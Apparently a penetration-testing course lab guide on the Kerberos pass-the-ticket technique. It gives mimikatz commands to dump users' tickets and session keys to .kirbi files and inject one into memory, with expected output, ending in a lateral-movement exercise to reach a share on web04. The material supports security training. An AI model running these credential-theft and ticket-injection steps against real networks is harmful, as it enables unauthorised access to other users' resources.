# Pass the Ticket

Verifying that the user jen has no access to the shared folder
>``` shell
>PS C:\Windows\system32> whoami
>
># ========== Expected Result ==========
>corp\jen
># =====================================
>
>PS C:\Windows\system32> ls \\web04\backup
>
># ========== Expected Result ==========
>ls : Access to the path '\\web04\backup' is denied.
>At line:1 char:1
>+ ls \\web04\backup
>+ ~~~~~~~~~~~~~~~~~
>    + CategoryInfo          : PermissionDenied: (\\web04\backup:String) [Get-ChildItem], UnauthorizedAccessException
>    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
># =====================================
>```

Exporting Kerberos TGT/TGS to disk
>``` shell
>mimikatz #privilege::debug
>
># ========== Expected Result ==========
>Privilege '20' OK
># =====================================
>
>mimikatz #sekurlsa::tickets /export
>
># ========== Expected Result ==========
>Authentication Id : 0 ; 2037286 (00000000:001f1626)
>Session           : Batch from 0
>User Name         : dave
>Domain            : CORP
>Logon Server      : DC1
>Logon Time        : 9/14/2022 6:24:17 AM
>SID               : S-1-5-21-1987370270-658905905-1781884369-1103
>
>         * Username : dave
>         * Domain   : CORP.COM
>         * Password : (null)
>
>        Group 0 - Ticket Granting Service
>
>        Group 1 - Client Ticket ?
>
>        Group 2 - Ticket Granting Ticket
>         [00000000]
>           Start/End/MaxRenew: 9/14/2022 6:24:17 AM ; 9/14/2022 4:24:17 PM ; 9/21/2022 6:24:17 AM
>           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
>           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
>           Client Name  (01) : dave ; @ CORP.COM ( CORP )
>           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ;
>           Session Key       : 0x00000012 - aes256_hmac
>             f0259e075fa30e8476836936647cdabc719fe245ba29d4b60528f04196745fe6
>           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
>           * Saved to file [0;1f1626]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi !
>...
># =====================================
>```

Exporting Kerberos TGT/TGS to disk
>``` shell
>PS C:\Tools> dir *.kirbi
>
># ========== Expected Result ==========
>    Directory: C:\Tools
>
>
>Mode                LastWriteTime         Length Name
>----                -------------         ------ ----
>-a----        9/14/2022   6:24 AM           1561 [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
>-a----        9/14/2022   6:24 AM           1505 [0;12bd0]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
>-a----        9/14/2022   6:24 AM           1561 [0;1c6860]-0-0-40810000-dave@cifs-web04.kirbi
>-a----        9/14/2022   6:24 AM           1505 [0;1c6860]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
>-a----        9/14/2022   6:24 AM           1561 [0;1c7bcc]-0-0-40810000-dave@cifs-web04.kirbi
>-a----        9/14/2022   6:24 AM           1505 [0;1c7bcc]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
>-a----        9/14/2022   6:24 AM           1561 [0;1c933d]-0-0-40810000-dave@cifs-web04.kirbi
>-a----        9/14/2022   6:24 AM           1505 [0;1c933d]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
>-a----        9/14/2022   6:24 AM           1561 [0;1ca6c2]-0-0-40810000-dave@cifs-web04.kirbi
>-a----        9/14/2022   6:24 AM           1505 [0;1ca6c2]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
>...
># =====================================
>```

Injecting the selected TGS into process memory
>``` shell
>mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
>
># ========== Expected Result ==========
>* File: '[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi': OK
># =====================================
>```

Inspecting the injected ticket in memory
>``` shell
>PS C:\Tools> klist
>
># ========== Expected Result ==========
>Current LogonId is 0:0x13bca7
>
>Cached Tickets: (1)
>
>#0>     Client: dave @ CORP.COM
>        Server: cifs/web04 @ CORP.COM
>        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
>        Ticket Flags 0x40810000 -> forwardable renewable name_canonicalize
>        Start Time: 9/14/2022 5:31:32 (local)
>        End Time:   9/14/2022 15:31:13 (local)
>        Renew Time: 9/21/2022 5:31:13 (local)
>        Session Key Type: AES-256-CTS-HMAC-SHA1-96
>        Cache Flags: 0
>        Kdc Called:
># =====================================
>```

Accessing the shared folder through the injected ticket
>``` shell
>PS C:\Tools> ls \\web04\backup
>
># ========== Expected Result ==========
>    Directory: \\web04\backup
>
>Mode                LastWriteTime         Length Name
>----                -------------         ------ ----
>-a----        9/13/2022   2:52 AM              0 backup_schemata.txt
># =====================================
>```

Lab 1 - Start VM Group 1 and try to execute the pass the ticket technique as illustrated in this section by first logging in to CLIENT76 as jen. Try to move laterally to web04 to get the flag located in the shared folder.
>``` shell
>
>```
>
